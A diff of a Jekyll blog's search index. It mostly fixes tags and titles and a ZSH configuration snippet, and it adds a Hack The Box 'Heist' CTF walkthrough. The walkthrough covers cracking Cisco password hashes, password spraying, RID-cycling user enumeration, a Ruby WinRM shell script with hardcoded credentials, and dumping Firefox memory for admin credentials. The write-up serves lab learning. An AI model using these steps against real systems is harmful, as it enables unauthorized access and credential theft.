@@ -3,7 +3,7 @@
   {
     "title": "Toolbox",
     "url": "/posts/toolbox/",
-    "categories": "cheatsheets, toolbox",
+    "categories": "Cheatsheet, Toolbox",
     "tags": "Tools",
     "date": "2022-04-03 13:55:00 +0100",
     
@@ -18,7 +18,7 @@
   {
     "title": "So I actually found a bug in the wild (XSS)",
     "url": "/posts/xss-bug-writeup/",
-    "categories": "writeup",
+    "categories": "Writeup",
     "tags": "XSS, Bug-Bounty, WebApp",
     "date": "2022-01-22 13:55:00 +0100",
     
@@ -33,8 +33,8 @@
   {
     "title": "ZSH Stuff",
     "url": "/posts/zsh/",
-    "categories": "",
-    "tags": "",
+    "categories": "Cheatsheet",
+    "tags": "ZSH, Linux",
     "date": "2022-01-22 13:55:00 +0100",
     
 
@@ -42,14 +42,14 @@
 
 
 
-    "snippet": "will share some cool stuff i have done to my zshto install most of these . stick in .zshrcMy PromptHere is my colourful PS1. i like this one it gives me the key info i want to see and I can copy the command i ran along with the time and date from the shell into my notesJeyll dont like it in a code block so grab it from HERETo install replace the $PROMPT varaiable in your .zshrc the one in the text file  aboveZSH plugins  fzf  zsh-completeions  zsh-autocompleteBindkeybindkey -e                                        # emacs key bindingsbindkey ' ' magic-space                           # do history expansion on spacebindkey '^[[3;5~' kill-word                       # ctrl + Suprbindkey '^[[3~' delete-char                       # deletebindkey '^[[1;5C' forward-word                    # ctrl + -&gt;bindkey '^[[1;5D' backward-word                   # ctrl + &lt;-bindkey '^[[5~' beginning-of-buffer-or-history    # page upbindkey '^[[6~' end-of-buffer-or-history          # page downbindkey '^[[H' beginning-of-line                  # homebindkey '^[[F' end-of-line                        # endbindkey '^[[Z' undo                               # shift + tab undo last action#bindkey \"${key[Up]}\" up-line-or-search\t           # &lt;word&gt; up arrow - will search history #bindkey \"${key[Down]}\" down-line-or-search \t  # &lt;word&gt; down arrow - will search history Hisotry Settings# https://zsh.sourceforge.io/Doc/Release/Options.htmlHISTFILE=\"$HOME/.zsh_history\"HISTSIZE=\"9999999999999\"SAVEHIST=\"999999999\"HIST_STAMPS=\"%d/%m/%y %T \"\t # zsh \thistory timestampHISTCONTROL=erasedups\t\t # dont have duplicates in historyHIST_IGNORE_DUPS=\"true\"\t\t # wont duplicate the same command if matches the last one setopt BANG_HIST                 # Treat the '!' character specially during expansion.setopt EXTENDED_HISTORY          # Write the history file in the \":start:elapsed;command\" format.setopt INC_APPEND_HISTORY        # Write to the history file immediately, not when the shell exits.setopt SHARE_HISTORY             # Share history between all sessions.setopt HIST_EXPIRE_DUPS_FIRST    # Expire duplicate entries first when trimming history.setopt HIST_IGNORE_DUPS          # Don't record an entry that was just recorded again.setopt HIST_IGNORE_ALL_DUPS      # Delete old recorded entry if new entry is a duplicate.setopt HIST_FIND_NO_DUPS         # Do not display a line previously found.setopt HIST_IGNORE_SPACE         # Don't record an entry starting with a space.setopt HIST_SAVE_NO_DUPS         # Don't write duplicate entries in the history file.setopt HIST_REDUCE_BLANKS        # Remove superfluous blanks before recording entry.setopt HIST_VERIFY               # Don't execute immediately upon history expansion.setopt HIST_BEEP                 # Beep when accessing nonexistent history.setopt hist_expire_dups_first    # delete duplicates first when HISTFILE size exceeds HISTSIZE#setopt hist_ignore_dups         # ignore duplicated commands history list#setopt hist_ignore_space        # ignore commands that start with space#setopt hist_verify              # show command with history expansion to user before running it#setopt share_history            # share command history dataMiscsetopt ALL_EXPORT\t\t# all variables set are exported setopt AUTO_CD\t\t\t# forogt cd then this will jump ..cd for yousetopt CORRECT\t\t\t# try and autocorrect commands "
+    "snippet": "will share some cool stuff i have done to my zshto install most of these . stick in .zshrcMy PromptHere is my colourful PS1. i like this one it gives me the key info i want to see and I can copy the command i ran along with the time and date from the shell into my notesJekyll dont like it in a code block so grab it from HERETo install replace the $PROMPT varaiable in your .zshrc the one in the text file  aboveZSH plugins  fzf  zsh-completeions  zsh-autocompleteBindkeybindkey -e                                        # emacs key bindingsbindkey ' ' magic-space                           # do history expansion on spacebindkey '^[[3;5~' kill-word                       # ctrl + Suprbindkey '^[[3~' delete-char                       # deletebindkey '^[[1;5C' forward-word                    # ctrl + -&gt;bindkey '^[[1;5D' backward-word                   # ctrl + &lt;-bindkey '^[[5~' beginning-of-buffer-or-history    # page upbindkey '^[[6~' end-of-buffer-or-history          # page downbindkey '^[[H' beginning-of-line                  # homebindkey '^[[F' end-of-line                        # endbindkey '^[[Z' undo                               # shift + tab undo last action#bindkey \"${key[Up]}\" up-line-or-search\t           # &lt;word&gt; up arrow - will search history #bindkey \"${key[Down]}\" down-line-or-search \t  # &lt;word&gt; down arrow - will search history History SettingsHere is my history configuration# https://zsh.sourceforge.io/Doc/Release/Options.htmlHISTFILE=\"$HOME/.zsh_history\"HISTSIZE=\"9999999999999\"SAVEHIST=\"999999999\"HIST_STAMPS=\"%d/%m/%y %T \"\t # zsh \thistory timestampHISTCONTROL=erasedups\t\t # dont have duplicates in historyHIST_IGNORE_DUPS=\"true\"\t\t # wont duplicate the same command if matches the last one setopt BANG_HIST                 # Treat the '!' character specially during expansion.setopt EXTENDED_HISTORY          # Write the history file in the \":start:elapsed;command\" format.setopt INC_APPEND_HISTORY        # Write to the history file immediately, not when the shell exits.setopt SHARE_HISTORY             # Share history between all sessions.setopt HIST_EXPIRE_DUPS_FIRST    # Expire duplicate entries first when trimming history.setopt HIST_IGNORE_DUPS          # Don't record an entry that was just recorded again.setopt HIST_IGNORE_ALL_DUPS      # Delete old recorded entry if new entry is a duplicate.setopt HIST_FIND_NO_DUPS         # Do not display a line previously found.setopt HIST_IGNORE_SPACE         # Don't record an entry starting with a space.setopt HIST_SAVE_NO_DUPS         # Don't write duplicate entries in the history file.setopt HIST_REDUCE_BLANKS        # Remove superfluous blanks before recording entry.setopt HIST_VERIFY               # Don't execute immediately upon history expansion.setopt HIST_BEEP                 # Beep when accessing nonexistent history.setopt hist_expire_dups_first    # delete duplicates first when HISTFILE size exceeds HISTSIZE#setopt hist_ignore_dups         # ignore duplicated commands history list#setopt hist_ignore_space        # ignore commands that start with space#setopt hist_verify              # show command with history expansion to user before running it#setopt share_history            # share command history dataMiscsetopt ALL_EXPORT\t\t# all variables set are exported setopt AUTO_CD\t\t\t# forogt cd then this will jump ..cd for yousetopt CORRECT\t\t\t# try and autocorrect commands "
   },
   
   {
     "title": "Linux Magic",
     "url": "/posts/linux-magic/",
-    "categories": "cheatsheet",
-    "tags": "",
+    "categories": "Cheatsheet",
+    "tags": "Cheatsheet, Linux",
     "date": "2022-01-22 13:55:00 +0100",
     
 
@@ -61,7 +61,7 @@
   },
   
   {
-    "title": "Level Up you Game!",
+    "title": "Level Up your Game!",
     "url": "/posts/level-up/",
     "categories": "Tips",
     "tags": "Tips",
@@ -76,7 +76,22 @@
   },
   
   {
-    "title": "Kioptrix Level 1",
+    "title": "Heist - Hack The Box",
+    "url": "/posts/htb-writeup-heist/",
+    "categories": "CTF, HackTheBox",
+    "tags": "CTF, HackTheBox",
+    "date": "2019-11-30 00:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "Heist starts off with a support page with a username and a Cisco IOS config file containing hashed &amp; encrypted passwords. After cracking two passwords from the config file and getting access to RPC on the Windows machine, I find additional usernames by RID cycling and then password spray to find a user that has WinRM access. Once I have a shell, I discover a running Firefox process and dump its memory to disk so I can do some expert-level forensics (ie: running strings) to find the administrator password.Summary  The admin page has guest access enabled and we can find a Cisco IOS configuration file on there  After cracking the three passwords from the config file, we are able to use rpcclient with one of the account to recover the list of usernames  Then we password spray the credentials we have and find that user chase can log in with WinRM  There’s a Firefox process already running on the box and we can obtain a memory dump from it  We find the administrator credentials in one of the browser request still in memoryPortscanroot@kali:~/htb/heist# nmap -sC -sV -p- -oA heist 10.10.10.149PORT      STATE SERVICE       VERSION80/tcp    open  http          Microsoft IIS httpd 10.0| http-cookie-flags:|   /:|     PHPSESSID:|_      httponly flag not set| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Support Login Page|_Requested resource was login.php135/tcp   open  msrpc         Microsoft Windows RPC445/tcp   open  microsoft-ds?5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49668/tcp open  msrpc         Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsWebsiteThe webpage has a simple login page with an option to log in as guest at the bottom:After logging in as guest, I find a Cisco configuration in the opened trouble tickets. I also make note of the Hazard username, this will be useful later.Cracking some credentialsThe Cisco IOS configuration file here has two different types of password hashes. Cisco uses various hash algorithms across different products and software versions. The old password encryption type is called Type 7 encryption and has been known to be extremely weak for about 20+ years now. I still see this being used in production environments every week even though it doesn’t provide any real security (it’s akin to just base64 encoding your passwords in your configs, it’s trivial to recover the plaintext).For the two usernames, the Type 7 passwords can be reversed with any of the many Type 7 reversing tools available such as https://packetlife.net/toolbox/type7/.  rout3r / $uperP@ssword  admin / Q4)sJu\\Y8qz*A3?dThe enable password uses the Type 5 encryption which is just a salted MD5 hash. Again, these should be avoided whenever possible since they can be cracked pretty quickly using a GPU. Using Type 8 (PBKDF2) or Type 9 provides more security since it takes longer to crack.With John, I’m quickly able to crack the password with the rockyou.txt list:root@kali:~/htb/heist# john -w=/usr/share/wordlists/rockyou.txt hash.txtWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"Use the \"--format=md5crypt-long\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusstealth1agent    (?)User enumeration with RPC clientI’ll create user.txt and add the potential usernames that I have so far (admin, administrator and hazard) then do the same with passwords in pass.txt. To test all credentials, I use crackmapexec:I found one valid account: hazard:stealth1agentScanning with smbmap I don’t find any open shares that this user has access to:root@kali:~/htb/heist# smbmap -u hazard -p stealth1agent -H 10.10.10.149[+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.149...[+] IP: 10.10.10.149:445\tName: heist.htb\tDisk                                                  \tPermissions\t----                                                  \t-----------\tADMIN$                                            \tNO ACCESS\tC$                                                \tNO ACCESS\tIPC$                                              \tREAD ONLYWith rpcclient I can connect and query the SID for the hazard user:root@kali:~/htb/heist# rpcclient -U hazard 10.10.10.149Enter WORKGROUP\\hazard's password:rpcclient $&gt; lookupnames hazardhazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)I can enumerate the list of users with lookupsids by changing the last digit of the SIDI got two additional users: chase and jasonLogging in to the box with WinRM and user chaseAfter password spraying with crackmapexec again, I found valid credentials for chaseThe port for WinRM is open so I’ll use that to log in:Note: I’m using evil-winrm these days but those screenshots were taken some time ago before I started using it.require 'winrm'# Author: Alamotconn = WinRM::Connection.new(  endpoint: 'http://10.10.10.149:5985/wsman',  #transport: :ssl,  user: 'chase',  password: 'Q4)sJu\\Y8qz*A3?d',  :no_ssl_peer_verification =&gt; true)command=\"\"conn.shell(:powershell) do |shell|    until command == \"exit\\n\" do        output = shell.run(\"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')\")        print(output.output.chomp)        command = gets        output = shell.run(command) do |stdout, stderr|            STDOUT.print stdout            STDERR.print stderr        end    end    puts \"Exiting with code #{output.exitcode}\"endExtracting more credentials from FirefoxI’ll upgrade that shell to a Meterpreter first:I check out the c:\\inetpub\\wwwroot\\ directory for any hardcoded credentials in the PHP code and find a SHA256 hash for an admin account in the login.php file:hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040')Fail: I wasn’t able to crack this hash nor did I find it on crackstation.net.When checking out the running processes, I notice that Firefox is running: 6264  5232  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exe 6388  6264  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exe 6588  792   wsmprovhost.exe          x64   0        SUPPORTDESK\\Chase  C:\\Windows\\System32\\wsmprovhost.exe 6656  6264  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exe 6732  792   dllhost.exe              x64   1        SUPPORTDESK\\Chase  C:\\Windows\\System32\\dllhost.exe 7052  6264  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exeIf Firefox is running then there might some credentials in memory so I’ll use procdump to create a memory dump and inspect it after:Before using a memory forensics tool like Volatility to inspect the memory dump, I’ll try using strings and grep to look for the string password:Looks like I found the admin’s credentials, I’ll use WinRM again to log in:"
+  },
+  
+  {
+    "title": "Kioptrix Level 1 - Vulnhub",
     "url": "/posts/kioptrix-level-1/",
     "categories": "CTF, Vulnhub",
     "tags": "CTF, Vulnhub",
